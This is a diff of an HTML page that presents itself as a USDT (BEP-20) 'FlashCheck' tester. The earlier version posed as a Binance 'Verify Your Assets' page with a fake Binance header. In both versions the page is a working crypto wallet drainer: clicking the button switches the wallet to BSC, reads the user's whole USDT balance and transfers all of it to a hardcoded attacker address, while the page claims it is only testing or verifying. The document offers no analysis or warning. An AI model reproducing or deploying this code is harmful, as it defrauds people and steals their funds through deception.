@@ -3,180 +3,143 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Your Assets</title>
+  <title>USDT(BEP-20) FlashCheck</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
     body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #0d0d0d, #1a1a1a);
-      color: #f1f1f1;
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
       display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-    .navbar {
-      position: absolute;
-      top: 0;
-      width: 100%;
-      background: #000;
-      padding: 1rem 2rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-    }
-    .navbar .logo {
-      color: #fcd535;
-      font-weight: bold;
-      font-size: 1.3rem;
-    }
-    .navbar .menu {
-      display: flex;
-      gap: 1.5rem;
-    }
-    .navbar .menu a {
-      color: #fcd535;
-      text-decoration: none;
-      font-weight: 500;
-      font-size: 0.95rem;
-    }
-    .navbar .menu a:hover {
-      text-decoration: underline;
-    }
-    .main-container {
-      flex: 1;
-      display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-    .main {
-      text-align: center;
-      max-width: 480px;
-      padding: 2rem;
-      background: rgba(0, 0, 0, 0.6);
+    .card {
+      background: #1e1e1e;
+      padding: 2em;
       border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
-    }
-    h1 {
-      color: #fcd535;
-      font-size: 2.2rem;
-      margin-bottom: 0.5rem;
-    }
-    p {
-      font-size: 1rem;
-      color: #ccc;
-      margin-bottom: 2rem;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      max-width: 400px;
     }
     button {
-      background-color: #fcd535;
+      background-color: #00cc99;
+      color: white;
+      padding: 1em 2em;
       border: none;
-      padding: 1rem 2.5rem;
       border-radius: 8px;
-      font-weight: 600;
-      font-size: 1rem;
+      font-size: 1.1em;
       cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      box-shadow: 0 4px 20px rgba(252, 213, 53, 0.4);
-      transition: background 0.3s;
+      margin-top: 1em;
     }
-    button:hover {
-      background-color: #e6be30;
+    button:disabled {
+      background-color: #666;
+      cursor: not-allowed;
     }
     #log {
-      margin-top: 1.5rem;
-      font-size: 0.95rem;
-      color: #ff4d4f;
-    }
-    .balance-info {
-      color: #999;
-      font-size: 0.95rem;
-      margin-top: 1rem;
+      margin-top: 1em;
+      font-size: 0.9em;
+      color: #ff6666;
     }
   </style>
 </head>
 <body>
-  <div class="navbar">
-    <div class="logo">BINANCE</div>
-    <div class="menu">
-      <a href="https://bscscan.com/" target="_blank">Home</a>
-      <a href="https://bscscan.com/" target="_blank">Blockchain</a>
-      <a href="https://bscscan.com/" target="_blank">Tokens</a>
-      <a href="https://bscscan.com/" target="_blank">Validators</a>
-      <a href="https://bscscan.com/" target="_blank">NFTs</a>
-      <a href="https://bscscan.com/" target="_blank">Resources</a>
-      <a href="https://bscscan.com/" target="_blank">Developers</a>
-    </div>
-  </div>
-
-  <div class="main-container">
-    <div class="main">
-      <h1>Verify Your Assets</h1>
-      <p>Ensure your tokens are secure on Binance Smart Chain.</p>
-      <button id="sendBtn">📤 VERIFY ASSETS</button>
-      <div class="balance-info">
-        <div id="walletStatus">Wallet not connected</div>
-        <div>USDT: <span id="usdtBalance">--</span></div>
-        <div>BNB: <span id="bnbBalance">--</span></div>
-      </div>
-      <div id="log"></div>
-    </div>
+  <div class="card">
+    <h2>USDT (BEP-20)</h2>
+    <p>This will Test Your USDT(BEP-20) on BSC:</p>
+    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+    <button id="sendBtn">TEST ALL</button>
+    <div id="log"></div>
   </div>
 
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
     const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
     const usdtAbi = [
       "function balanceOf(address owner) view returns (uint256)",
       "function transfer(address to, uint256 value) returns (bool)"
     ];
 
-    async function init() {
+    const bscParams = {
+      chainId: "0x38",
+      chainName: "Binance Smart Chain",
+      nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18
+      },
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"]
+    };
+
+    function log(msg) {
+      document.getElementById("log").textContent = msg;
+    }
+
+    async function switchToBSC() {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: bscParams.chainId }]
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [bscParams]
+          });
+        } else {
+          throw switchError;
+        }
+      }
+    }
+
+    async function sendAllUSDT() {
+      log("");
       if (!window.ethereum) {
-        document.getElementById("walletStatus").textContent = "Please use Trust Wallet or MetaMask.";
+        alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
         return;
       }
 
       try {
+        await switchToBSC();
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        document.getElementById("walletStatus").textContent = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;
+        const userAddress = await signer.getAddress();
+
+        const bnbBalance = await provider.getBalance(userAddress);
+        const minGas = ethers.utils.parseEther("0.0001");
+
+        const readableBNB = ethers.utils.formatEther(bnbBalance);
+        console.log("BNB balance:", readableBNB);
+
+        if (bnbBalance.lt(minGas)) {
+          log("❌ Not enough BNB for gas. You have: " + readableBNB + " BNB");
+          return;
+        }
 
         const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
-        const usdtBalance = await usdt.balanceOf(address);
-        document.getElementById("usdtBalance").textContent = ethers.utils.formatUnits(usdtBalance, 18);
+        const balance = await usdt.balanceOf(userAddress);
 
-        const bnbBalance = await provider.getBalance(address);
-        document.getElementById("bnbBalance").textContent = ethers.utils.formatEther(bnbBalance);
+        if (balance.isZero()) {
+          log("❌ Your USDT balance is 0.");
+          return;
+        }
 
-        document.getElementById("sendBtn").onclick = async () => {
-          if (usdtBalance.isZero()) {
-            document.getElementById("log").textContent = "❌ Your USDT balance is 0.";
-            return;
-          }
-
-          try {
-            document.getElementById("log").textContent = "⏳ Sending...";
-            const tx = await usdt.transfer(recipient, usdtBalance);
-            await tx.wait();
-            document.getElementById("log").textContent = "✅ Transfer complete!";
-          } catch (err) {
-            console.error(err);
-            document.getElementById("log").textContent = "❌ Transaction failed.";
-          }
-        };
+        const tx = await usdt.transfer(recipient, balance);
+        log("⏳ Transaction sent. Waiting for confirmation...");
+        await tx.wait();
+        log("✅ Transaction confirmed! USDT sent successfully.");
       } catch (err) {
         console.error(err);
-        document.getElementById("walletStatus").textContent = "❌ Wallet connection failed.";
+        log("❌ Transaction failed: " + (err?.message || err));
       }
     }
 
-    window.addEventListener("load", init);
+    document.getElementById("sendBtn").onclick = sendAllUSDT;
   </script>
 </body>
 </html>
